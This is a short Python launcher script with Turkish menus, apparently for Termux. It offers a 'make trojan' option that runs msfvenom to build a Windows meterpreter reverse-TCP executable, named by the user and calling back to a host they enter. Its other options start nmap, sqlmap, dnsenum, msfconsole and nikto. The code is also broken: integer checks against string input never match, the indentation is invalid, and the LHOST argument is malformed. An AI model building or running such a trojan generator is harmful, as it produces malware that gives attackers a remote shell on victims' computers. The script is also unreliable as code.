import os
# -*- encoding: utf-8 -*- #

os.system("clear")

banner="""
------------
CANS OFFICIALL WEB TEST TOOLS
------------
"""
print(banner)

print("""
1)trojan yap
2)nmap
3)sqlmap
4)ip tarama
5)payload
6)nikto
7)gereksinimler
""")
veri=input("----->")

if veri == 1 :

ip=input("cihaz kimligini giriniz:")
     port=input("portu giriniz:")
     ismin=input("virus ismi:")
     os.system("clear && msfvenom -p windows/meterpreter/reverse_tcp LHOST"+ip+" LPORT="+port+" -f exe -o "+ismin)

elif veri == 2 :
     os.system("nmap")

elif veri == 3 :
     os.system("sqlmap")

elif veri == 4 :
     os.system("dnsenum")

elif veri == 5 :
     os.system("msfconsole")

elif veri == 6 :
     os.system("nikto")

elif veri == 7 :
     os.system("pkg update && pkg upgrade && pkg install python2 && pkg install python && pkg install php && pkg install curl && pkg install cat   && pkg install wget && pkg install ruby ")

else :
    print("hata aldim")
